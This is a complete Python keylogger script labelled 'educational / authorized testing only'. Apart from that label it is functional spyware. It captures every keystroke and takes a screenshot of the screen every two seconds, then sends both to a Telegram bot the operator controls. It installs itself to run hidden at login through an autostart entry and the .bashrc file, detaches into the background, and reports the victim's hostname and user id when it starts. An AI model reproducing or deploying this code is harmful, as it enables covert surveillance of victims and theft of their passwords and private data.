#!/usr/bin/env python3
"""
keylogger.py — Keystroke + Screenshot Logger (Educational / Authorized Testing Only)
====================================================================================
Captures keystrokes and screenshots, exfiltrates to Telegram.
FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL USE ONLY.
"""
import os, sys, threading, time, io, platform
from datetime import datetime
import requests

# ── CONFIGURE YOUR OWN TOKEN & CHAT ID HERE ─────────────────────────────
TOKEN = "YOUR_BOT_TOKEN"
CHAT  = "YOUR_CHAT_ID"
# ─────────────────────────────────────────────────────────────────────────

BUFFER = []
LOCK = threading.Lock()

def persist():
    script = os.path.abspath(sys.argv[0])
    ad = os.path.expanduser("~/.config/autostart")
    os.makedirs(ad, exist_ok=True)
    dp = os.path.join(ad, ".keylogger.desktop")
    with open(dp, "w") as f:
        f.write(f"[Desktop Entry]\nType=Application\nName=keylogger\n"
                f"Exec=python3 {script} --hide\nTerminal=false\n"
                f"X-GNOME-Autostart-enabled=true\nHidden=true\nNoDisplay=true\n")
    br = os.path.expanduser("~/.bashrc")
    marker = f"python3 {script} --hide"
    with open(br) as f:
        if marker not in f.read():
            with open(br, "a") as f2:
                f2.write(f"\n{marker} >/dev/null 2>&1 &\n")

def send(text):
    try:
        r = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                          data={"chat_id": CHAT, "text": text}, timeout=15)
        return r.status_code == 200
    except:
        return False

def send_photo(png):
    try:
        r = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                          files={"photo": ("s.png", png, "image/png")},
                          data={"chat_id": CHAT}, timeout=30)
        return r.status_code == 200
    except:
        return False

def flush():
    global BUFFER
    with LOCK:
        if not BUFFER: return
        t = "".join(BUFFER)
        BUFFER = []
    if t.strip():
        send(f"[{datetime.now().strftime('%H:%M:%S')}] {t[:4000]}")

def on_press(key):
    try:
        from pynput.keyboard import Key
        m = {Key.enter: "\n", Key.tab: "[TAB]", Key.space: " ",
             Key.backspace: "[BS]", Key.esc: "[ESC]", Key.delete: "[DEL]",
             Key.up: "[UP]", Key.down: "[DOWN]", Key.left: "[LEFT]", Key.right: "[RIGHT]",
             Key.home: "[HOME]", Key.end: "[END]", Key.page_up: "[PGUP]", Key.page_down: "[PGDN]",
             Key.caps_lock: "[CAPS]", Key.shift: "", Key.shift_r: "", Key.ctrl: "",
             Key.ctrl_r: "", Key.alt: "", Key.alt_r: "", Key.cmd: "", Key.cmd_r: ""}
        if key in m: k = m[key]
        elif hasattr(key, 'char') and key.char is not None: k = key.char
        else: k = ""
        with LOCK: BUFFER.append(k)
    except:
        pass

def keys_loop():
    from pynput.keyboard import Listener
    with Listener(on_press=on_press) as l: l.join()

def screenshot_loop():
    from PIL import Image
    import mss
    while True:
        try:
            with mss.MSS() as sct:
                mon = sct.monitors[0]
                raw = sct.grab(mon)
                img = Image.frombytes("RGB", raw.size, raw.rgb)
                buf = io.BytesIO()
                img.save(buf, format="PNG", optimize=True)
                send_photo(buf.getvalue())
        except:
            pass
        for _ in range(40): time.sleep(0.05)

def main():
    if "--hide" in sys.argv:
        persist()
        pid = os.fork()
        if pid > 0:
            print(f"[+] PID {pid} (startup installed)")
            sys.exit(0)
        os.setsid()
        sys.stdout.close()
        sys.stderr.close()
        sys.stdin.close()

    send(f"[ACTIVE] {platform.node()} uid={os.getuid()} pid={os.getpid()}")
    threading.Thread(target=keys_loop, daemon=True).start()
    threading.Thread(target=screenshot_loop, daemon=True).start()
    while True:
        time.sleep(2)
        flush()

if __name__ == "__main__":
    main()
